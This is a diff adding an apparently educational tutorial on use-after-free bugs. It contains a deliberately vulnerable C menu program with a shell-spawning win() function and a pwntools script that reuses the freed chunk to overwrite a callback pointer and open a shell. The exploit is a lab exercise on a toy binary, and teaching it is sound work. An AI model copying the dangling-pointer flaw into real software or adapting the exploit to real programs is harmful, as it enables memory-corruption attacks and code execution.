@@ -1,1 +1,118 @@
+A Use-After-Free (UAF) vulnerability occurs when a program continues to use a pointer to an object on the heap after that object has been freed.
+When a program calls free(pointer), the memory allocator marks that chunk of memory as available for future allocations, but it does not erase the data or automatically clear the pointer variable (creating a dangling pointer).
+If an attacker can force the program to allocate a new object that occupies the exact same memory space, they can manipulate the data. When the program later tries to use the original dangling pointer, it will execute or read the attacker's substituted data.
 
+1. The Vulnerable C Program (uaf_vuln.c)
+
+In this example, we have two different structures that happen to share the exact same size (8 bytes on a 32-bit system).
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void win() {
+    printf("[+] Target achieved! Opening shell...\n");
+    system("/bin/sh");
+}
+
+void safe_function() {
+    printf("[*] Executing safe standard function.\n");
+}
+
+struct custom_service {
+    void (*callback)(); 
+    int service_id;
+};
+
+struct normal_user {
+    char data[8];
+};
+
+// Global dangling pointer
+struct custom_service *global_service;
+
+int main() {
+    setbuf(stdout, NULL);
+    char choice;
+    struct normal_user *user;
+
+    while(1) {
+        printf("\n1. Allocate Service\n2. Free Service (Delete)\n3. Allocate User Data\n4. Trigger Service\nExit\nChoice: ");
+        scanf(" %c", &choice);
+
+        if (choice == '1') {
+            global_service = malloc(sizeof(struct custom_service));
+            global_service->callback = safe_function;
+            global_service->service_id = 1001;
+            printf("[+] Allocated service chunk at %p\n", (void*)global_service);
+        }
+        else if (choice == '2') {
+            // VULNERABILITY: The memory is freed, but global_service is never set to NULL!
+            free(global_service);
+            printf("[-] Freed service chunk.\n");
+        }
+        else if (choice == '3') {
+            user = malloc(sizeof(struct normal_user));
+            printf("[+] Allocated user data chunk at %p\n", (void*)user);
+            printf("Enter data (8 bytes): ");
+            read(0, user->data, 8);
+        }
+        else if (choice == '4') {
+            // VULNERABILITY: Using a dangling pointer after it was freed
+            printf("[*] Triggering service callback...\n");
+            global_service->callback(); 
+        }
+        else {
+            exit(0);
+        }
+    }
+    return 0;
+}
+Use code with caution.
+
+2. How the Exploit Works (The Heap Lifecycle)
+
+Memory allocators optimize for speed. When a chunk of memory is freed, it goes into a recycling bin (like a fastbin or tcache bin). When a new request for the exact same size comes in, the allocator hands back the exact same chunk to save time.
+1. Allocate Service (Choice 1): A chunk is created at address 0x0804a000. The first 4 bytes contain the address of safe_function.
+2. Free Service (Choice 2): The chunk at 0x0804a000 is freed. The global_service variable still points to 0x0804a000.
+3. Allocate User Data (Choice 3): The allocator recycles 0x0804a000 and assigns it to user. We type in the static address of win(). This overwrites the first 4 bytes of that chunk.
+4. Trigger Service (Choice 4): The program calls global_service->callback(). Because global_service still points to 0x0804a000, the CPU looks at the first 4 bytes, finds the address of win(), and jumps to it.
+
+3. The Python UAF Exploit Script (uaf_exploit.py)
+
+Using pwntools, we can simulate navigating the menu interface to orchestrate the allocation, deletion, substitution, and final hijack.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Start the binary process
+io = process('./uaf_vuln')
+
+# Static address of win() found via static analysis (GDB or Objdump)
+win_address = p32(0x080491b6)
+
+# Step 1: Allocate the initial service object
+io.recvuntil(b"Choice: ")
+io.sendline(b"1")
+
+# Step 2: Free the service object (creating the dangling pointer)
+io.recvuntil(b"Choice: ")
+io.sendline(b"2")
+
+# Step 3: Allocate user data. 
+# The allocator will recycle the exact same memory chunk.
+io.recvuntil(b"Choice: ")
+io.sendline(b"3")
+
+# Send the win() function address as the data input to overwrite the callback pointer
+io.recvuntil(b"Enter data (8 bytes): ")
+io.sendline(win_address)
+
+# Step 4: Trigger the dangling pointer call
+io.recvuntil(b"Choice: ")
+io.sendline(b"4")
+
+# Keep the shell interactive
+io.interactive()
+Use code with caution.
